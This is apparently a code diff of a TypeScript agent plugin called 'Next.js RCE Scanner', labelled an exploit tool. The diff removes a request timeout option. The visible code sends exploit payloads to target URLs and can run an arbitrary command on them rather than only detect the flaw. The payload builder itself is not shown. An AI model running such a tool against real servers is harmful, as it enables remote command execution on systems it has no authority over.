@@ -3,7 +3,7 @@
  *
  * @plugin nextjs_rce_scanner
  * @name Next.js RCE Scanner
- * @version 1.0.0
+ * @version 1.0.3
  * @author Sentinel Team
  * @main_category agent
  * @category exploit
@@ -19,7 +19,6 @@ interface ToolInput {
     targets: string[];
     command?: string;
     detectOnly?: boolean;
-    timeout?: number;
 }
 
 interface ToolOutput {
@@ -74,13 +73,6 @@ export function get_input_schema() {
                 description: "是否只检测不执行命令（true=仅检测，false=执行命令）",
                 default: false
             },
-            timeout: {
-                type: "integer",
-                description: "请求超时时间（毫秒）",
-                default: 5000,
-                minimum: 1000,
-                maximum: 30000
-            }
         }
     };
 }
@@ -248,7 +240,6 @@ function isExploitSuccessful(output: string | null, command: string): boolean {
 async function sendExploitRequest(
     url: string,
     payload: string,
-    timeout: number
 ): Promise<{responseText: string; status: number; responseTime: number; redirectHeader: string | null; error?: string}> {
     const startTime = Date.now();
 
@@ -265,8 +256,6 @@ async function sendExploitRequest(
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             },
             body: payload,
-            // @ts-ignore - timeout may be supported by runtime
-            timeout: timeout
         });
 
         const responseTime = Date.now() - startTime;
@@ -343,7 +332,6 @@ export async function analyze(input: ToolInput): Promise<ToolOutput> {
 
         const targets = validTargets;
         const command = input.command || 'id';
-        const timeout = input.timeout || 5000;
         const detectOnly = input.detectOnly || false;
 
         const results: Array<{
@@ -372,7 +360,7 @@ export async function analyze(input: ToolInput): Promise<ToolOutput> {
 
                     const effectiveCommand = detectOnly ? 'id' : command;
                     const payload = generateExploitPayload(effectiveCommand);
-                    const requestResult = await sendExploitRequest(targetUrl, payload, timeout);
+                    const requestResult = await sendExploitRequest(targetUrl, payload);
 
                     if (requestResult.error) {
                         continue;
